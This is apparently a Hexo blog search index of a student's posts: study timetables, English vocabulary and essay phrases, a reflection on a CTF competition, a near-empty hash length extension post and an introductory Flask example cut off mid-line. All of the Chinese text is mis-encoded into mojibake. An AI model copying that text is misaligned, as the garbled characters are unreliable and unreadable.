<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>day12_15</title>
      <link href="/2021/12/15/day12-15/"/>
      <url>/2021/12/15/day12-15/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¦æ…¢æ…¢çš„å…»æˆä¸æ”¾è‚†çš„ä¹ æƒ¯</p><span id="more"></span><p>8:15-9:15  :èƒŒå•è¯</p><p>9:15-9ï¼š45ï¼šå¤ä¹ å›¾è®º</p><p>12:30-13ï¼š40ï¼šåƒé¥­åŠ æ´—è¡£æœ</p><p>14:10-16:40ï¼šçœ‹ä½œæ–‡</p><p>19:10-21:40  å¬å¬åŠ›</p><p>21:50-10:30ï¼šå¤ä¹ ä»Šå¤©è‹±è¯­</p><p>11:00-12:00ï¼šå†™java</p><p>æ™šä¸Šåˆ«ç©æ‰‹æœºäº†ï¼ï¼ï¼ </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»Šæ—¥å•è¯</title>
      <link href="/2021/12/14/%E4%BB%8A%E6%97%A5%E5%8D%95%E8%AF%8D/"/>
      <url>/2021/12/14/%E4%BB%8A%E6%97%A5%E5%8D%95%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>å•è¯</th><th>æ±‰æ„</th></tr></thead><tbody><tr><td>priority</td><td>ä¼˜å…ˆï¼Œä¼˜å…ˆäº‹é¡¹</td></tr><tr><td>decision</td><td>å†³å®š,ç»“è®º</td></tr><tr><td>reflect</td><td>ååº”ï¼Œåæ˜ </td></tr><tr><td>sufficient</td><td>è¶³å¤Ÿçš„ï¼Œå……åˆ†çš„</td></tr><tr><td>excess</td><td>è¿‡é‡çš„</td></tr><tr><td>disorder</td><td>ç´Šä¹±ï¼Œç–¾ç—…</td></tr><tr><td>variation</td><td>å˜åŒ–</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>12-14è®¡åˆ’</title>
      <link href="/2021/12/14/12-14%E8%AE%A1%E5%88%92/"/>
      <url>/2021/12/14/12-14%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€å®šä¸è¦ç©æ‰‹æœºï¼Œä¸€å®šä¸è¦ï¼ï¼ï¼ï¼âŒâŒâŒâŒâŒâŒâŒâŒâŒ</p><span id="more"></span><p>ï¼ˆæ¯å®Œæˆä¸€é¡¹ï¼Œåé¢ç”»å¯¹é’©ï¼‰</p><p>9ï¼š50-10:30  æ´—æ¾¡ ğŸ‘˜âœ”</p><p>10:40-11:10   å®éªŒæŠ¥å‘ŠğŸ˜£âœ”</p><p>11ï¼š10-14:10  ä¸€ä¸ªå°æ—¶å¬åŠ›ï¼Œä¸€ä¸ªå°æ—¶å•è¯ï¼Œä¸€ä¸ªå°æ—¶ä½œæ–‡ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“ğŸ±â€ğŸ‘“</p><p>14:10-14:25  å¤ä¹ å•è¯ğŸ±â€ğŸš€ğŸ±â€ğŸš€ğŸ±â€ğŸš€</p><p>9:40-11:40 å¤ä¹ ç¦»æ•£å›¾è®º</p><p>12:30 ç¡è§‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é‡‘ç›¾æ¯åæ€</title>
      <link href="/2021/12/13/%E9%87%91%E7%9B%BE%E6%9D%AF%E5%8F%8D%E6%80%9D/"/>
      <url>/2021/12/13/%E9%87%91%E7%9B%BE%E6%9D%AF%E5%8F%8D%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™ä¸€æ˜ŸæœŸï¼Œæ¯å¤©æ—©ä¸Šèµ·æ¥éƒ½çœ‹ä¸€ä¸‹</p><span id="more"></span><p>åˆšæ‰æ„£äº†ä¸€ä¸‹ï¼Œè¿™å¥½åƒæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å†™åæ€ã€‚å¸Œæœ›é™ˆæŸ¯è¨€å¯ä»¥åšåˆ°æ¯å¤©å†™åæ€ï¼Œæ¯æ¬¡æ¯”èµ›å†™åæ€ã€‚ä¸å†™åæ€æ€ä¹ˆå¯èƒ½è¿›æ­¥ï¼Ÿï¼Ÿï¼Ÿ</p><h3 id="ç†è®ºé¢˜"><a href="#ç†è®ºé¢˜" class="headerlink" title="ç†è®ºé¢˜"></a>ç†è®ºé¢˜</h3><p>è¿™éƒ¨åˆ†æ˜¯æˆ‘è´Ÿè´£çš„â€¦ä½†æ˜¯åšçš„å¾ˆå·®ï¼ŒçœŸçš„å¾ˆå·®ï¼Œæ’å257ï¼Œï¼Ÿï¼Ÿï¼Ÿï¼Œæˆ‘ä»¬æ€»æ’åç¬¬2ï¼Œæˆ‘éä½†æ²¡æœ‰å¸®ä¸Šå¿™ï¼Œè¿˜æ‹–åè…¿äº†ã€‚ã€‚ã€‚</p><p>é¦–å…ˆï¼Œåœ¨åšäº†å‡ é“é¢˜ç›®ä¹‹åï¼Œæˆ‘å°±æœ‰ç‚¹ä¸è€å¿ƒäº†ï¼Œå¤´è„‘å‘è’™ï¼Œæƒ³ä¸ºä»€ä¹ˆä»–ä»¬å¯ä»¥çœ‹é¢˜ï¼Œæˆ‘å´åšè¿™ä¸ªæ²¡æœ‰ç”¨çš„ä¸œè¥¿ã€‚æˆ‘ä¸åº”è¯¥è¿™æ ·çš„ã€‚ä»»ä½•äººéœ€è¦å„å¸å…¶èŒã€‚é€ºç¥ä»–ä»¬æ¯”è¾ƒå‰å®³ï¼Œå¯ä»¥ä¸ºå›¢é˜Ÿåšå‡ºæ¯”è¾ƒå¤§çš„è´¡çŒ®ï¼Œæˆ‘æš‚æ—¶èƒ½åŠ›è¾ƒå¼±ï¼Œä½†æ˜¯è¿™ä¸ªåˆ†å€¼ä¹Ÿå¾ˆå¤§ï¼Œ2400ï¼Œæˆ‘æ²¡æœ‰æŠŠæ¡ä½ã€‚æ²¡æœ‰è€å¿ƒæ˜¯æˆ‘å¾ˆå¤§çš„é—®é¢˜ï¼Œå…¶å®è¿™ä¸ªä¹Ÿæœ‰å¥½å¤„å•Šï¼Œå¦‚æœæˆ‘åœ¨åšé¢˜ç›®çš„æ—¶å€™å¥½å¥½çœ‹çœ‹é¢˜ç›®ï¼Œè‡ªèº«åœ¨æ€è€ƒæ€è€ƒï¼Œé‚£æˆ‘ä¹Ÿå¯ä»¥å­¦åˆ°æ–°çš„çŸ¥è¯†ï¼Œå¼€é˜”äº†çŸ¥è¯†é¢†åŸŸï¼Œå¯ä»¥å¯¹ä¸“ä¸šæœ‰è¿›ä¸€æ­¥çš„ç†è§£ã€‚æˆ‘é”™å¤±äº†è¿™ä¸ªæœºä¼šï¼Œè€Œä¸”æ²¡æœ‰å–å¾—æ¯”è¾ƒå¥½çš„æˆç»©ï¼Œæ‹–äº†ä»–ä»¬çš„åè…¿ã€‚æˆ‘æ²¡æœ‰åšå¥½çš„åº”è¯¥åšçš„ä»»åŠ¡ï¼Œæˆ‘æµ®èºäº†ï¼Œè¿™æ˜¯ä¸€å®šè¦æ”¹æ­£çš„ï¼Œä¸€å®šè¦çš„ã€‚å¸Œæœ›ä¸‹æ¬¡ï¼Œé™ˆæŸ¯è¨€åœ¨åšè‡ªå·±çš„ä»»åŠ¡çš„æ—¶å€™ï¼Œå¯ä»¥è®¤çœŸè´Ÿè´£ï¼Œä¸è¦æ€¥èºï¼Œè®¤çœŸçš„åšå¥½æ¯ä¸€ä»¶äº‹æƒ…ã€‚åˆä¸ç€æ€¥å¯¹å§ï¼Œå¹²å˜›è¦æ€¥åŒ†åŒ†çš„å‘¢ï¼Ÿäº«å—å½“ä¸‹ï¼Œä»å½“ä¸‹çš„æ¯ä¸€ä»¶äº‹æƒ…ä¸­éƒ½å¯ä»¥å­¦åˆ°æ–°çš„çŸ¥è¯†ï¼Œè¿™æ¬¡æ˜¯æˆ‘æƒ³è¦çš„ã€‚</p><h3 id="ä¸Šä¼ ä½ çš„å¤´åƒ"><a href="#ä¸Šä¼ ä½ çš„å¤´åƒ" class="headerlink" title="ä¸Šä¼ ä½ çš„å¤´åƒ"></a>ä¸Šä¼ ä½ çš„å¤´åƒ</h3><p>è¿™é“é¢˜ç›®æ˜¯æœ‰æ€è·¯çš„ï¼Œå¹¶ä¸”æ€è·¯æ­£ç¡®</p><p>åŸå› ç¬¬ä¸€ï¼šè¿˜æ˜¯æ²¡æœ‰è€å¿ƒã€‚æˆ‘å¹³æ—¶åšé¢˜çš„æ—¶å€™ï¼Œéœ€è¦ç”¨åˆ°çˆ†ç ´å•Šï¼Œä»€ä¹ˆç«äº‰çš„æ—¶å€™ï¼Œæˆ‘æ€»æ˜¯ç­‰ä¸åŠã€‚è¿™æ¬¡æ¯”èµ›ä¾ç„¶å¦‚æ­¤ï¼Œæˆ‘è·‘äº†ä¸€ä¼šï¼Œæ²¡å‡ºç»“æœï¼Œå°±æ”¾å¼ƒäº†ã€‚æˆ‘è®°å¾—ä»¥å‰é—®è¿‡é€ºç¥ä¸€é“é¢˜ç›®ï¼Œæ˜¯å…³äºçˆ†ç ´md5å€¼çš„ã€‚é€ºç¥ç›´æ¥å†™è„šæœ¬è·‘äº†å‡ºæ¥ï¼Œå¾ˆå¤šæ¡æ•°æ®ç¡¬ç”Ÿç”Ÿçš„è·‘äº†å‡ºæ¥ã€‚å¥½ä¸œè¥¿æ€»æ˜¯å€¼å¾—ç­‰å¾…çš„ã€‚æˆ‘å¹³æ—¶ç”Ÿæ´»ä¹Ÿå°±è¿™æ ·ï¼Œæƒ³è¦çš„ä¸œè¥¿å°±æ˜¯è¿«ä¸åŠå¾…çš„æƒ³å¾—åˆ°ã€‚ä½†å¾€å¾€ä¸å¦‚æ„¿ï¼Œè‡ªå·±åƒäºäº†ä¹Ÿæ²¡æœ‰ä¹°åˆ°å¥½ä¸œè¥¿ã€‚å¾ˆé•¿æ—¶é—´äº†ä¾ç„¶æ²¡æœ‰æ”¹æ­£è¿‡æ¥ã€‚é—®é¢˜ç©¶ç«Ÿå‡ºåœ¨é‚£é‡Œï¼Ÿè¿˜æ˜¯æ¯”è¾ƒè‚¤æµ…å—ï¼Œä¸æ²‰ç¨³ã€‚ä½†æ˜¯æ€ä¹ˆæ‰å¯ä»¥ç»ƒå°±æ²‰ç¨³çš„æ€§æ ¼ã€‚å…¶å®å¹³æ—¶çœ‹é€ºç¥ï¼Œå°±å¯ä»¥çœ‹å‡ºæ¥ä»–æ˜¯ä¸ªååˆ†æ²‰ç¨³çš„äººï¼Œèƒ½æ²‰çš„ä½æ°”ï¼Œè¿™æ˜¯æˆåŠŸçš„ä¸€å¤§éƒ¨åˆ†</p><p>ä¸‹é¢æ˜¯åœ¨ç½‘ä¸Šæ‰¾çš„</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ã€æ²‰ç¨³ä¸è¦éšä¾¿æ˜¾éœ²ä½ çš„æƒ…ç»ªã€‚ä¸è¦é€¢äººå°±è¯‰è¯´ä½ çš„å›°éš¾å’Œé­é‡ã€‚åœ¨å¾è¯¢åˆ«äººçš„æ„è§ä¹‹å‰ï¼Œè‡ªå·±å…ˆæ€è€ƒï¼Œä½†ä¸è¦å…ˆè®²ã€‚ä¸è¦ä¸€æœ‰æœºä¼šå°±å” å¨ä½ çš„ä¸æ»¡ã€‚é‡è¦çš„å†³å®šå°½é‡ä¸åˆ«äººå•†é‡ï¼Œæœ€å¥½éš”ä¸€å¤©å†å‘å¸ƒã€‚è®²è¯ä¸è¦æœ‰ä»»ä½•çš„æ…Œå¼ ï¼Œèµ°è·¯ä¹Ÿæ˜¯ã€‚ç»†å¿ƒå¯¹èº«è¾¹å‘ç”Ÿçš„äº‹æƒ…ï¼Œå¸¸æ€è€ƒå®ƒä»¬çš„å› æœå…³ç³»ã€‚å¯¹åšä¸åˆ°ä½çš„æ‰§è¡Œé—®é¢˜ï¼Œè¦å‘æ˜å®ƒä»¬çš„æ ¹æœ¬ç—‡ç»“ã€‚å¯¹ä¹ ä»¥ä¸ºå¸¸çš„åšäº‹æ–¹æ³•ï¼Œè¦æœ‰æ”¹è¿›æˆ–ä¼˜åŒ–çš„å»ºè®®ã€‚</span><br><span class="line">äºŒã€ä¸è¦æœ‰æƒåŠ›çš„å‚²æ…¢å’ŒçŸ¥è¯†çš„åè§ã€‚ä»»ä½•æˆæœå’Œæˆå°±éƒ½åº”å’Œåˆ«äººåˆ†äº«ã€‚å¿…é¡»æœ‰äººç‰ºç‰²æˆ–å¥‰çŒ®çš„æ—¶å€™ï¼Œè‡ªå·±èµ°åœ¨å‰é¢ã€‚è¯šä¿¡åšä¸åˆ°çš„äº‹æƒ…ä¸è¦è¯´ï¼Œè¯´äº†å°±åŠªåŠ›åšåˆ°ã€‚è™šçš„å£å·æˆ–æ ‡è¯­ä¸è¦å¸¸æŒ‚å˜´ä¸Šã€‚</span><br><span class="line">ä¸‰ã€ä¸è¦å› è¯´é”™è¯è€Œæ¨å¸è´£ä»»ï¼Œè¯´äº†é”™è¯å°±è¦å°±åº”è¯¥åœ¨å—åˆ°è´¨ç–‘æ—¶è‡ªè§‰æ‰¿æ‹…ã€è¯šæ³è®¤é”™æ”¹æ­£ã€‚è¯´è¿‡äº†ä»€ä¹ˆåˆ«äººæ˜¯ä¼šçŸ¥é“çš„ï¼Œä¸è¦æ€»æ˜¯å°è¯•ç€æ©ç›–æ‰ã€‚ä¸è¦æ€»æ˜¯æŠŠå¥½åƒã€å¤§æ¦‚ã€å¯èƒ½ä¹‹ç±»çš„è¯æ”¾åœ¨å˜´è¾¹ï¼Œç‰¹åˆ«æ˜¯è·Ÿä¸Šçº§åšäº¤æµæ±‡æŠ¥æ—¶ã€‚ä¸è¦å› ä¸ºä¸å¯¹æ–¹äº²å¯†åˆæ‹è€Œä¸æ³¨æ„ç¤¼èŠ‚ã€‚åˆ‡å‹¿åœ¨æ¶è¯­ä¸­ä¼¤ä»–äººï¼Œä¹Ÿè¦éšä¾¿åœ¨èƒŒåè¯´åˆ«äººåè¯ï¼Œè¦ç®¡ä½è‡ªå·±çš„å˜´ã€‚ç¥¸ä»å£å‡ºï¼Œè¿™å¥è¯æ˜¯äº˜å¤ä¸å˜çš„çœŸç†å•Šã€‚ä¸è¦å»ä¾µçŠ¯åˆ«äººçš„éšç§ï¼Œçªç„¶é—´å¹²æ¶‰è°ˆè®ºåˆ«äººçš„ç§ç”Ÿæ´»ï¼Œå¦åˆ™åˆ«äººä¼šè®¤ä¸ºä½ å¤ªè¿‡å…«å¦ã€‚</span><br><span class="line">ç¨³é‡çš„æ€§æ ¼ä¸ä»…æ˜¯ä¸€ä¸ªäººå¿ƒç†æˆç†Ÿçš„è¡¨ç°ï¼Œæ›´æ˜¯ä¸ºè‡ªå·±èµ¢å¾—æˆåŠŸçš„åŸºç¡€ã€‚ç¨³é‡çš„æ€§æ ¼æ˜¯éœ€è¦åœ¨ç”Ÿæ´»ä¸­ç£¨ç‚¼å‡ºæ¥çš„ï¼Œè€Œå¹¶éæ˜¯æ¯ä¸ªäººå¤©ç”Ÿå°±èƒ½æ‹¥æœ‰çš„ã€‚æ‹¥æœ‰ç¨³é‡æ€§æ ¼çš„äººèƒ½åšåˆ°é‡äº‹ä¸æ…Œä¹±ï¼Œä»å®¹é¢å¯¹ç”Ÿæ´»ä¸­å‡ºç°çš„ä»»ä½•å±æœºã€‚</span><br></pre></td></tr></table></figure><p>æ¯å¤©ä¸€çœ‹ï¼Œæ—¶åˆ»æé†’è‡ªå·±</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è‹±è¯­ä½œæ–‡</title>
      <link href="/2021/12/13/%E8%8B%B1%E8%AF%AD%E4%BD%9C%E6%96%87/"/>
      <url>/2021/12/13/%E8%8B%B1%E8%AF%AD%E4%BD%9C%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¸Œæœ›å››çº§å¯ä»¥è¿‡ï¼ï¼ï¼ä¿ä½‘</p><span id="more"></span><h3 id="2021-6-2"><a href="#2021-6-2" class="headerlink" title="2021-6-2"></a>2021-6-2</h3><h4 id="é¢˜ç›®ï¼šDo-violent-video-games-lead-to-violence"><a href="#é¢˜ç›®ï¼šDo-violent-video-games-lead-to-violence" class="headerlink" title="é¢˜ç›®ï¼šDo violent video games lead to violence?"></a>é¢˜ç›®ï¼šDo violent video games lead to violence?</h4><p>è¿™æ˜¯ä¸€ä¸ªè®®è®ºæ–‡ï¼Œè¦è¡¨è¾¾è‡ªå·±çš„è§‚ç‚¹</p><h5 id="å•è¯"><a href="#å•è¯" class="headerlink" title="å•è¯"></a>å•è¯</h5><table><thead><tr><th>å•è¯</th><th align="left">å¥å­</th></tr></thead><tbody><tr><td>popularization    æ™®åŠï¼Œé€šä¿—åŒ–</td><td align="left">With the popularization of Internet and  smartphones,it is much easier for children today to get access to video games,many of which contain violent elements.</td></tr><tr><td>relieve   å‡è½»ï¼Œç¼“å’Œ     anxiety  ç„¦è™‘      stress å‹åŠ›   to some extent åœ¨ä¸€å®šç¨‹åº¦ä¸Š despite the fact that å°½ç®¡äº‹å®æ˜¯</td><td align="left">Despite the fact that they help children to relieve  anxiety and stress,violent video will lead to childrenâ€™s violent behavior to some extent.(despiteä¸èƒ½ä¸butè¿ç”¨)</td></tr><tr><td>mislead è¯¯å¯¼     reasonable åˆç†çš„ï¼Œæœ‰ç†ç”±çš„  prone  æœ‰åšåäº‹çš„å€¾å‘</td><td align="left">Firstly,violent elements in these video games will mislead children considering violence reasonable,thus making them more prone to solve problems violently.</td></tr><tr><td>frustration  æŒ«æŠ˜ temper è„¾æ°” encouraging å¯¼è‡´ impulsive æµ®èºï¼Œå‡­å†²åŠ¨è¡Œäº‹çš„ reckless é²è½çš„ï¼Œä¸è®¡åæœçš„</td><td align="left">Secondlyï¼Œwhen they experience frequent failures in the games,the feeling of frustration might develop their bad temper,encouraging their impulsive and reckless.</td></tr><tr><td>In addition æ­¤å¤– adolescence é’æ˜¥æœŸ perception çŸ¥è§‰æ„Ÿè§‰</td><td align="left"></td></tr><tr><td>As far as I can see åœ¨æˆ‘çœ‹æ¥ mental health å¿ƒç†å¥åº·     spiritual well-being ç²¾ç¥å¯Œè¶³ establish å»ºç«‹</td><td align="left">As far as I can see,parents and teachers should pay more attentions to childrenâ€™s mental health and spiritual well-being,thus they can establish their own judgement.</td></tr><tr><td>increasingly  å¢é•¿çš„</td><td align="left">The use of xxx is becoming increasingly popular.</td></tr><tr><td>rapid å¿«é€Ÿçš„ï¼Œè¿…é€Ÿçš„   economic  ç»æµçš„</td><td align="left">For the rapid economic development nowadays,these are more and more opportunities to do sth</td></tr><tr><td>notion  çœ‹æ³•ï¼Œè§‚å¿µï¼Œä¿¡å¿µï¼Œç†è§£</td><td align="left">notions about sth differ widely</td></tr></tbody></table><table><thead><tr><th>å•è¯</th><th>å¥å­</th></tr></thead><tbody><tr><td>process  è¿‡ç¨‹ï¼Œå¤„ç†åŠ å·¥     operate æ“ä½œï¼Œè¿è¡Œ    In addition   å¦å¤–      complex  å¤æ‚çš„</td><td></td></tr><tr><td>moreover è€Œä¸” precise å‡†ç¡®åœ°   accuracy  å‡†ç¡®åœ°   degrade  é™ä½    severe   ååˆ†ä¸¥é‡çš„</td><td></td></tr></tbody></table><h3 id="2020-9-3"><a href="#2020-9-3" class="headerlink" title="2020-9-3"></a>2020-9-3</h3><h4 id="é¢˜ç›®ï¼šonline-libraries"><a href="#é¢˜ç›®ï¼šonline-libraries" class="headerlink" title="é¢˜ç›®ï¼šonline libraries"></a>é¢˜ç›®ï¼šonline libraries</h4><table><thead><tr><th>å•è¯</th><th>å¥å­</th></tr></thead><tbody><tr><td></td><td>xxx are becoming more popular.It brings great benefits to people</td></tr><tr><td>inevitable   ä¸å¯é¿å…çš„   outweigh  å¤§äºï¼Œè¶…è¿‡</td><td>As for me,the advantage of xxx outweigh the disadvantage</td></tr><tr><td>meanwhile   ä¸æ­¤åŒæ—¶    region  åœ°åŒºï¼Œè¡Œæ”¿åŒº perspective  è§‚ç‚¹æ€åº¦</td><td>from my perspective</td></tr><tr><td>boredom</td><td>æ— èŠ</td></tr><tr><td>trendy</td><td>æ—¶é«¦çš„</td></tr><tr><td>innovation</td><td>é©æ–°</td></tr><tr><td>tedious</td><td>ä¹å‘³çš„</td></tr><tr><td>daydream</td><td>ç™½æ—¥æ¢¦</td></tr><tr><td>valid</td><td>æœ‰æ•ˆçš„</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>day12-13</title>
      <link href="/2021/12/13/day12-13/"/>
      <url>/2021/12/13/day12-13/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ä»Šæ—¥è®¡åˆ’"><a href="#ä»Šæ—¥è®¡åˆ’" class="headerlink" title="ä»Šæ—¥è®¡åˆ’"></a>ä»Šæ—¥è®¡åˆ’</h1><ul><li>10:00-12:30 å¬1ä¸ªåŠå°æ—¶è‹±è¯­å¬åŠ›ï¼ŒèƒŒ1å°æ—¶å•è¯</li><li>12ï¼š30-13:00 åƒåˆé¥­</li><li>13:00-13:40 ç¡åˆè§‰</li><li>13:50-16:50 ç¦»æ•£å›¾è®º</li><li>17:00-18:50 æ±‡ç¼–å¤ä¹ æ¥å£éƒ¨åˆ†</li><li>19:10åˆ°æ ¡ä¸Šè¯¾ï¼Œè®¡åˆ’å†™åˆ°21:30</li><li>21:30-22ï¼š30 ï¼šèƒŒè‹±è¯­ä½œæ–‡</li><li>10:50åˆ°å®¿èˆ</li><li>11:00-11:30 èƒŒç¿»è¯‘</li><li>11:30-12:00 å¤ä¹ ä»Šå¤©çš„è‹±è¯­æˆæœ</li><li>12:30ç¡è§‰</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hashå“ˆå¸Œæ‹“å±•æ”»å‡»</title>
      <link href="/2021/12/11/hash%E5%93%88%E5%B8%8C%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2021/12/11/hash%E5%93%88%E5%B8%8C%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªæ˜¯sha1çš„åŠ å¯†åŸç†ï¼Œçœ‹é”™äº†â€¦å…ˆä¿å­˜ç€å§ï¼Œä¼šç”¨ä¸Šçš„</p><p><img src="C:\Users\12230\AppData\Roaming\Typora\typora-user-images\image-20211211220306396.png" alt="image-20211211220306396"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Flaskæ¡†æ¶å­¦ä¹ </title>
      <link href="/2021/12/09/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/09/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>Flaskæœ¬èº«ç›¸å½“äºä¸€ä¸ªå†…æ ¸ï¼ˆæ ¹æ®å†…æ ¸çš„æ¦‚å¿µï¼Œæˆ‘çš„ç†è§£æ˜¯æˆ‘ä»¬çš„ä»£ç ç›¸å½“äºæ˜¯è½¯ä»¶ï¼Œç„¶åé€šè¿‡flaskå®æ–½å¯¹ç¡¬ä»¶çš„ç®¡ç†ï¼Œå°±æ˜¯æœ€åå‘ˆç°å‡ºæ¥çš„é¡µé¢ï¼‰ï¼Œå‡ ä¹æ‰€æœ‰çš„æ‰€æœ‰çš„åŠŸèƒ½éƒ½éœ€è¦ç”¨åˆ°æ‰©å±•ï¼Œéƒ½éœ€è¦ç”¨ç¬¬ä¸‰æ–¹æ‰©å±•æ¥å®ç°ã€‚</p><h3 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h3><h4 id="wsgi"><a href="#wsgi" class="headerlink" title="wsgi"></a>wsgi</h4><hr><p>Python Web Server Gateway Interface,å®ƒä¸ºpythonè¯­è¨€å†™çš„webæœåŠ¡å™¨ä»¥åŠwebåº”ç”¨ç¨‹åºæˆ–æ¡†æ¶ä¹‹é—´çš„ä¸€ç§ç®€å•è€Œé€šç”¨çš„æ¥å£ã€‚</p><p>wsgiåˆ†ä¸ºä¸¤éƒ¨åˆ†</p><ul><li>Server/GateWayï¼šå³Http Serverï¼Œè´Ÿè´£ä»å®¢æˆ·ç«¯ï¼ˆNginxï¼Œapacheï¼Œiisï¼‰æ¥å—è¯·æ±‚ï¼Œå°†requestè½¬å‘ç»™applicationï¼Œå¹¶å°†applicationè¿”å›çš„resè¿”å›åˆ°å®¢æˆ·ç«¯</li><li>Application/Framework:ä¸€ä¸ªpython webåº”ç”¨æˆ–è€…æ˜¯webæ¡†æ¶ï¼Œæ¥æ”¶åˆ°serverè½¬å‘çš„requestï¼Œå¤„ç†è¯·æ±‚ï¼Œå¹¶å°†å¤„ç†ç»“æœè¿”å›ç»™server</li></ul><h3 id="å¯ä¾›å­¦ä¹ çš„æ–‡æ¡£"><a href="#å¯ä¾›å­¦ä¹ çš„æ–‡æ¡£" class="headerlink" title="å¯ä¾›å­¦ä¹ çš„æ–‡æ¡£"></a>å¯ä¾›å­¦ä¹ çš„æ–‡æ¡£</h3><ol><li>ä¸­æ–‡æ–‡æ¡£ï¼ˆ<a href="http://docs.jinkan.org/docs/flask/%EF%BC%89">http://docs.jinkan.org/docs/flask/ï¼‰</a></li><li>è‹±æ–‡æ–‡æ¡£ï¼ˆ<a href="http://flask.pocoo.org/docs/0.11/%EF%BC%89">http://flask.pocoo.org/docs/0.11/ï¼‰</a></li><li>æ‰©å±•åˆ—è¡¨ï¼š(<a href="http://flask.pocoo.org/extensions/%EF%BC%89">http://flask.pocoo.org/extensions/ï¼‰</a></li></ol><h3 id="ç¬¬ä¸€ä¸ªwebæœåŠ¡"><a href="#ç¬¬ä¸€ä¸ªwebæœåŠ¡" class="headerlink" title="ç¬¬ä¸€ä¸ªwebæœåŠ¡"></a>ç¬¬ä¸€ä¸ªwebæœåŠ¡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class Flask(Scaffold) Flask å¯¹è±¡å®ç°äº†ä¸€ä¸ª WSGI åº”ç”¨ç¨‹åºå¹¶å……å½“ä¸­å¿ƒå¯¹è±¡ã€‚</span></span><br><span class="line"><span class="string">å®ƒä¼ é€’äº†åº”ç”¨ç¨‹åºçš„æ¨¡å—æˆ–åŒ…çš„åç§°ã€‚ä¸€æ—¦åˆ›å»ºï¼Œå®ƒå°†å……å½“è§†å›¾åŠŸèƒ½ã€URL è§„åˆ™ã€æ¨¡æ¿é…ç½®ç­‰çš„ä¸­å¤®æ³¨å†Œè¡¨ã€‚</span></span><br><span class="line"><span class="string">åŒ…çš„åç§°ç”¨äºä»åŒ…å†…éƒ¨æˆ–æ¨¡å—æ‰€åœ¨çš„æ–‡ä»¶å¤¹è§£æèµ„æºï¼Œ</span></span><br><span class="line"><span class="string">å…·ä½“å–å†³äºåŒ…å‚æ•°æ˜¯è§£æä¸ºå®é™…çš„ python åŒ…ï¼ˆåŒ…å« __init__.py æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼‰</span></span><br><span class="line"><span class="string">è¿˜æ˜¯æ ‡å‡†æ¨¡å—ï¼ˆåªæ˜¯ä¸€ä¸ª .py æ–‡ä»¶ï¼‰ã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†è·¯ç”±æ˜ å°„åˆ°è§†å›¾å‡½æ•°ï¼Œindex()</span></span><br><span class="line"><span class="comment">#æˆ‘çš„ç†è§£æ˜¯å¦‚æœè®¿é—®/,é‚£ä¹ˆè°ƒç”¨index()</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;HelloWorld&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Flaskåº”ç”¨ç¨‹åºå®ä¾‹çš„runæ–¹æ³• å¯åŠ¨webæœåŠ¡</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span 